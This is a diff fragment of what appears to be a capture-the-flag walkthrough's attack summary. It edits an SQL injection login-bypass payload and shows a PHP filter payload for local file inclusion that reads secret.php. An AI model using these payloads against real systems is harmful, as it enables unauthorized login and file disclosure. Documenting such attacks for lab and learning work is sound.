@@ -9,7 +9,7 @@
 
 ## 🚩 Attack Flow Summary
 1. **Initial Access**: SQLi bypass on login page → Gained web app access  
-   `comte' OR 1=1 --`  
+   `comte' AND 1=1 -- -`  
 2. **LFI Exploitation**:  
    ```bash
    ?file=php://filter/convert.base64-encode/resource=secret.php
